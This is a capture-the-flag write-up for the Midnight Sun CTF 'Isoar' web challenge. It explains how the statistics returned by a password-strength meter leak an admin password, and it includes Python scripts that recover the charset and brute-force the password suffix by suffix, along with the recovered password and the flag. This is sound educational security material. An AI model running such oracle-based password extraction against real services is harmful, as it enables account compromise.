# Isoar(Web, 31 solves, 150pts)


We start off with a url to the website: http://web.midnightsunctf.se:8000
The webapp allows us to check our passwords strength and receive a random fact about the supplied password:

```
"The given password occurs as part of 10 out of 1001 known passwords"
"The given password has 0 lowercase characters"
"The given password has the same amount of uppercase characters as 997 out of 1001 known passwords"
"The given password is shorter than 399 out of 1001 known passwords"
"The given password is longer than 155 out of 1001 known passwords"
"The first character of the given password occurs in 137 out of 1001 known passwords"
"The third character of the given password occurs in 83 out of 1001 known passwords"
"2 out of 1001 known passwords are suffixed with the given password"
"The given password has 6 characters"
"The given password has 6 digits"
"The fifth character of the given password occurs in 53 out of 1001 known passwords" 
```



`http://web.midnightsunctf.se:8000/robots.txt` has an interesting entry: `Disallow: /static/public.password.list`


[public.password.list](public.password.list) contains a list of 1000 common passwords while the messages mention 100**1** passwords, perhaps the admins password is included in the analysis but not the list?


The most interesting response type is `"2 out of 1001 known passwords are suffixed with the given password"`. Using that, we can try a bunch of suffixes and by calculating our version of the output (we do have 1000 out of the 1001 passwords) we're able to tell if admins password is included in their output or not.

That is actually enough to just brute-force the password char by char, but as it turns out that is **super** slow, mainy because:

 * We have to calculate a 2 byte proof of work for each request
 * The output message type is also randomized so we have to try a bunch of them before getting the correct one

// PS: You might think that we could bypass the poc by sending the same poc output and try to get the correct message type but it seems the message type actually depended on the poc output


What we're gonna need is a charset.

Another type of an interesting response is `"The fifth character of the given password occurs in 53 out of 1001 known passwords"` it tells us in how many passwords a certain letter from our supplied password occurs.

We can throw against it a lot of random passwords and build the admins password charset using the same technique as with the suffixes.

Putting all of this together, we get:

A boilerplate with required primitives:

``` python
import requests
from hashlib import sha256
import random
import string
import json
import re


alph = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
def password_poc(password):
	while True:
		poc = ''.join([random.choice(alph) for x in range(10)])
		if sha256(password+poc).hexdigest().startswith('1337'):
			return poc

def check_password(password):
	url = "http://web.midnightsunctf.se:8000/pwmeter/%s/%s" % (password, poc)
	r = requests.get(url)
	return r.content


with open('public.password.list') as f:
	passwords = f.read().split('\n')


def count_words(position, letter):
	s = filter(lambda x: letter in x, passwords)
	return len(s)

translate_pos = {'first':0, 'second':1, 'third':2, 'fourth':3, 'fifth':4}
```



Script to scrap the charset

``` python

CHARSET = ""

while True:
	rand_input = ''.join([random.choice(alph) for x in range(random.randint(1, 16))])
	reg = r"The (.*) character of the given password occurs in (.*) out of 1001 known passwords"
	
	response = json.loads(check_password(rand_input))["analysis"]

	re_found = re.findall(reg, response)
	if re_found:
		position, number = re_found[0]
		number = int(number)

		letter = None
		pos = None

		if position == 'last':
			letter = rand_input[-1]
			pos = len(rand_input)-1
		else:
			pos = translate_pos[position]
			letter = rand_input[pos]

		my_count = count_words(pos, letter)

		if my_count != number:
			print(letter)
			if letter not in CHARSET:
				CHARSET += letter
				print(CHARSET)
```


Script to finally find the password

``` python
def count_word_suffix(suffix):
	s = filter(lambda x:x.endswith(suffix), passwords)
	return len(s)


final_password = ""

while True:
	#                    found charset
	for letter_addon in 'lryHws3od0P4':
		print(letter_addon)
		rand_input = letter_addon + final_password
		
		found = False
		while True:

			reg = r"(.*) out of 1001 known passwords are suffixed with the given password"

			r = re.findall(reg, json.loads(check_password(rand_input))['analysis'])

			if r:
				their_count = int(r[0])
				my_count = count_word_suffix(rand_input)

				if their_count != my_count:
					print(their_count, my_count, rand_input)
					final_password = letter_addon + final_password
					print(final_password)
					found=True
				else:
					print("no")

				break
		if found:
			break
```

Running all of this finally gave us the password:`H3rHolyP4ssw0rd`
And the flag: `midnight{Someone_didnt_bother_reading_my_carefully_prepared_memo_on_commonly_used_passwords}`

